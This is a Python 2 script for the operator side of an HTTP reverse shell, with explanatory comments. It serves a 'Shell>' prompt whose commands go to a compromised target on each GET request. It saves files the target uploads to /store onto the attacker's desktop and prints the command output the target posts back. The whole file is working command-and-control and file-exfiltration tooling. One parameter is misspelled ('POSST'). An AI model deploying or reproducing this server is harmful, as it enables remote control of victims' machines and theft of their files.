# basic HTTP server_class

import BaseHTTPServer
import os, cgi # used to store received file locally

# host IP & listening port
HOST_NAME = '192.168.100.187'
PORT_NUMBER = 80

# MyHandler defines what we should do when we receive a GET/POST request from client / target
class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):

    def do_GET(s):
        # if we got a GET request, we will take user input
        command = raw_input("Shell> ")
        # return HTML status 200 (OK)
        s.send_response(200)
        # inform target that content type header is "text/html"
        s.send_header("Content-type", "text/html")
        s.end_headers()
        # send the command which we got from the user input
        s.wfile.write(command)

    def do_POST(s):

        # verify if "/store" is in URL
        # -> then this is a POST for file transfer, so we will parse the POST header, if its value was 'mulitpart/form-data'
        # then we will pass the POST parameters to FieldStorage class, the "fs" object containt the returned values form FieldStorage in dictionary fashion

        if s.path == '/store':
            try:
                ctype, pdict = cgi.parse_header(s.headers.getheader('content-type'))
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage(fp = s.rfile,
                                            headers = s.headers,
                                            environ = {'REQUEST_METHOD':'POSST'}
                                        )
                else:
                    print '[-] Unexpected POST request'

                fs_up = fs['file'] # on client side we submitted the file in dictionary fashion and used the key 'file'
                                   # to hold the actual file. Now here to retrieve the actual file, we use that key

                with open('/root/Desktop/1.txt', 'wb') as o: # create a file holder called '1.txt' and write received file into this
                    o.write(fs_up.file.read())
                    s.send_response(200)
                    s.end_headers()

            except Exception as e:
                print e

            return # once we stored the received file in our file holder, we exit the function

        s.send_response(200)
        s.end_headers()
        # define the length which means how many bytes the HTTP POST data contains, value has to be integer
        length = int(s.headers['Content-Length'])
        # read then print the posted data
        postVar = s.rfile.read(length)
        print postVar


if __name__ == '__main__':

    # we start a server_class and create httpd object and pass our IP+Port and class handler (MyHandler)
    server_class = BaseHTTPServer.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
    try:
        # start the HTTP server, if we get CTRL+C we will interrupt and stop the server
        httpd.serve_forever()
    except KeyboardInterrupt:
        print '[!] Server is terminated'
        httpd.server_close()
